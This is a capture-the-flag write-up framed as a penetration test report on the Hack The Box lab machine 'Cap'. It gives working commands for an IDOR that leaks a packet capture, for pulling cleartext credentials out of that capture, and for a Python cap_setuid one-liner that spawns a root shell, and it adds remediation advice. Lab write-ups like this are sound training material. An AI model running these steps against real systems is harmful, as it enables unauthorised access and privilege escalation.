# Hack The Box: Cap - Penetration Test Report

**Target:** 10.10.10.245 (Linux)
**Role:** Penetration Tester
**Date:** 2026-01-04

---

## 1. Executive Summary
This report details the penetration testing process conducted on the machine "Cap." The objective was to identify security vulnerabilities and establish an exploit chain to gain administrative (root) access.

The assessment revealed a critical **Insecure Direct Object Reference (IDOR)** vulnerability in the web application, which allowed for the exfiltration of sensitive network logs (PCAP files). These logs contained cleartext credentials, granting initial system access. Root privilege escalation was achieved by exploiting an insecurely configured **Linux Capability** (`cap_setuid`) on the system Python binary.

---

## 2. Technical Walkthrough

### 2.1 Reconnaissance
The engagement began with a TCP network scan to identify exposed services.

Bash 

nmap -sV -p- --min-rate 5000 10.10.10.245
# Open Ports Identified:
# 22/tcp (SSH): OpenSSH 8.2p1
# 80/tcp (HTTP): Gunicorn (Python WSGI Server)
2.2 Initial Foothold (Web Application)
Accessing port 80 revealed a "Security Dashboard." The application URL structure for downloading data was noted as http://10.10.10.245/data/0.

Vulnerability: IDOR By modifying the integer in the URL (/data/0, /data/1), it was possible to access data belonging to other sessions. Specifically, ID 0 returned a PCAP (Packet Capture) file.

Credential Exfiltration: Analyzing 0.pcap using strings and Wireshark revealed cleartext FTP authentication traffic.

Bash

strings 0.pcap | grep "PASS" -B 1
# Username: nathan
# Password: Buck3tH4TF0RM3!
Using these credentials, SSH access was established successfully.

Bash

ssh nathan@10.10.10.245
2.3 Privilege Escalation (Root)
Manual enumeration of the file system focused on non-standard permissions and capabilities.

Bash

getcap -r / 2>/dev/null
Finding: The /usr/bin/python3.8 binary possessed the cap_setuid+ep capability.

Impact: This capability allows the process to manipulate its User ID (UID) indiscriminately.

Exploitation: A Python one-liner was executed to set the UID to 0 (root) and spawn a system shell.

Bash

/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Result:

Root shell obtained.

root.txt flag retrieved.

3. Vulnerability & Risk Assessment
The following findings detail the specific risks identified during the engagement for remediation.

Finding 01: Insecure Direct Object Reference (IDOR)
Severity: High

Description: The web application fails to properly validate user authorization for the /data/ endpoint. Attackers can iterate through IDs to access sensitive PCAP files.

Remediation: Implement server-side access control checks to ensure the requesting user owns the data object before serving the file.

Finding 02: Cleartext Credentials in Network Logs
Severity: High

Description: Administrative credentials were captured in plaintext within network traffic logs stored on the server.

Remediation: Enforce encrypted protocols (SFTP/HTTPS) for all authentication traffic. Configure logging mechanisms to mask or exclude sensitive authentication headers.

Finding 03: Insecure Linux Capabilities (Privilege Escalation)
Severity: Critical

Description: The python3.8 binary was assigned the cap_setuid capability, effectively granting it SUID root powers.

Remediation: Remove the capability immediately to adhere to the principle of least privilege.

Bash

setcap -r /usr/bin/python3.8
4. Certification
Completion Status: Verified
